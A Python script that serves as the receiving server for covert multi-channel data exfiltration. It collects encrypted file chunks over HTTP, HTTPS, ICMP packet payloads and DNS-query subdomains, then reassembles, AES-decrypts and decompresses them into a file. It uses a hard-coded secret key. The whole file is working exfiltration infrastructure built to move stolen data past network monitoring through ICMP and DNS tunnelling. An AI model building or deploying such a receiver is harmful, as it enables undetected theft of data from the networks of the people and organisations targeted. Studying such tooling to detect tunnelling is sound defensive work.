import os
import threading
import zlib
import base64
import hashlib
import ssl
import time
from flask import Flask, request, jsonify
from scapy.all import IP, ICMP, UDP, Raw, sniff, DNS, DNSQR
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad

# Configuration
SECRET_KEY = "mysecretkey12345"
stop_sniffer = threading.Event()
dict_lock = threading.Lock()
received_chunks = {}

# Flask Server for HTTP and HTTPS Reception
app = Flask(__name__)

@app.route('/receive_payload', methods=['POST'])
def receive_payload():
    try:
        data = request.json
        print(f"[HTTP/HTTPS - Debug] Received POST request: {data}")
        if not data or 'identifier' not in data or data['identifier'] != 'PAYLOAD':
            print("[HTTP/HTTPS] Invalid payload or missing identifier")
            return jsonify({"error": "Invalid payload"}), 400

        chunk_index = int(data['chunk_index'])
        chunk = base64.b64decode(data['chunk'].encode('ascii'))
        with dict_lock:
            if chunk_index not in received_chunks:
                received_chunks[chunk_index] = chunk
                print(f"[Receiver - HTTP/HTTPS] Received chunk index {chunk_index}: {chunk}")
            else:
                print(f"[Receiver - HTTP/HTTPS] Duplicate chunk index {chunk_index} ignored.")
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"[Receiver - HTTP/HTTPS] Error: {e}")
        return jsonify({"error": str(e)}), 500

def start_http_server():
    # Adjusted to listen on all interfaces
    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)

def start_https_server():
    # Adjusted to listen on all interfaces
    app.run(host="0.0.0.0", port=5001, ssl_context=('cert.pem', 'key.pem'), debug=False, use_reloader=False)

def icmp_listener():
    interface_name = "eth0"  # Use the interface that was working before
    def process_packet(packet):
        if packet.haslayer(ICMP) and packet.haslayer(Raw):
            data = packet[Raw].load
            if data.startswith(b'PAYLOAD|'):
                parts = data.split(b'|', 2)
                if len(parts) == 3:
                    chunk_index = int(parts[1].decode('ascii'))
                    chunk = parts[2]
                    with dict_lock:
                        if chunk_index not in received_chunks:
                            received_chunks[chunk_index] = chunk
                            print(f"[Receiver - ICMP] Received chunk index {chunk_index}: {chunk}")
                        else:
                            print(f"[Receiver - ICMP] Duplicate chunk index {chunk_index} ignored.")

    print("[ICMP Listener] Starting ICMP listener...")
    sniff(filter="icmp",
          prn=process_packet,
          store=0,
          iface="eth0",  # Using the original interface name
          stop_filter=lambda x: stop_sniffer.is_set())

def dns_listener():
    interface_name = "eth0"  # Use the interface that was working before
    def process_packet(packet):
        if packet.haslayer(DNSQR):
            domain = packet[DNSQR].qname.decode('utf-8').rstrip('.')
            if domain.endswith('.example.com'):
                parts = domain.split('.')
                if len(parts) >= 3:
                    try:
                        chunk_index = int(parts[0])
                        chunk_b32 = parts[1]
                        chunk = base64.b32decode(chunk_b32 + '=' * ((8 - len(chunk_b32) % 8) % 8))
                        with dict_lock:
                            if chunk_index not in received_chunks:
                                received_chunks[chunk_index] = chunk
                                print(f"[Receiver - DNS] Received chunk index {chunk_index}: {chunk}")
                            else:
                                print(f"[Receiver - DNS] Duplicate chunk index {chunk_index} ignored.")
                    except Exception as e:
                        print(f"[Receiver - DNS] Error decoding chunk: {e}")
        elif packet.haslayer(DNS):
            # Process DNS responses if necessary
            pass  # For now, we're only processing DNS queries

    print("[DNS Listener] Starting DNS listener...")
    sniff(filter="udp port 53",
          prn=process_packet,
          store=0,
          iface="eth0",  # Using the original interface name
          stop_filter=lambda x: stop_sniffer.is_set())

def decrypt_and_decompress_payload(payload):
    try:
        key = hashlib.sha256(SECRET_KEY.encode('utf-8')).digest()
        iv = payload[:16]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(payload[16:]), AES.block_size)
        print(f"[Debug] Decrypted payload size: {len(decrypted)} bytes")
        decompressed = zlib.decompress(decrypted)
        print(f"[Debug] Decompressed payload size: {len(decompressed)} bytes")
        return decompressed  # Return binary data
    except Exception as e:
        raise ValueError(f"Error decrypting or decompressing payload: {e}")

def reassemble_payload():
    with dict_lock:
        if not received_chunks:
            print("[Reassembler] No chunks received.")
            return

        # Log received chunks and ensure no duplicates
        expected_chunks = sorted(received_chunks.keys())
        print(f"[Reassembler] Received chunks (sorted): {expected_chunks}")

        # Check for missing chunks
        total_chunks = max(expected_chunks) + 1  # Assuming chunks are zero-indexed
        missing_chunks = set(range(total_chunks)) - set(received_chunks.keys())
        if missing_chunks:
            print("[Reassembler] Cannot reassemble payload. Missing chunks: ", missing_chunks)
            return


        # Reassemble the payload
        try:
            sorted_chunks = [received_chunks[key] for key in expected_chunks]
            reassembled_payload = b''.join(sorted_chunks)
            print(f"[Reassembler] Reassembled payload size: {len(reassembled_payload)} bytes")
        except KeyError as e:
            print(f"[Reassembler] KeyError while sorting chunks: {e}")
            return

        # Decrypt and decompress the payload
        try:
            decrypted_payload = decrypt_and_decompress_payload(reassembled_payload)
            # Save the decrypted payload to a file
            output_file_path = 'received_file.txt'  # Replace with desired output file name
            with open(output_file_path, 'wb') as f:
                f.write(decrypted_payload)
            print(f"[Receiver] Final Reassembled and Decrypted Payload saved to '{output_file_path}'")
        except Exception as e:
            print(f"[Receiver] Error decrypting payload: {e}")

def verify_chunks():
    with dict_lock:
        total_chunks = len(received_chunks)
        print(f"[Verifier] Total chunks received: {total_chunks}")
        if max(received_chunks.keys(), default=-1) + 1 != total_chunks:
            print("[Verifier] Some chunks are missing. Reassembly might fail.")

def wait_for_chunks(timeout=60):
    start_time = time.time()
    while time.time() - start_time < timeout:
        with dict_lock:
            if received_chunks:
                return True
        time.sleep(1)
    print("[Main] Timeout waiting for chunks.")
    return False

# Main
if __name__ == "__main__":
    interface_name = "eth0"  # Replace with your actual interface name

    # Start servers and listeners
    threading.Thread(target=start_http_server, daemon=True).start()
    threading.Thread(target=start_https_server, daemon=True).start()
    threading.Thread(target=icmp_listener, daemon=True).start()
    threading.Thread(target=dns_listener, daemon=True).start()

    # Wait for payload to be received
    print("[Main] Waiting for payload to be received...")
    if not wait_for_chunks(timeout=60):  # Adjust timeout as needed
        print("[Main] No chunks received within the timeout. Exiting.")
        exit(1)


    # Verify and reassemble the payload
    verify_chunks()
    reassemble_payload()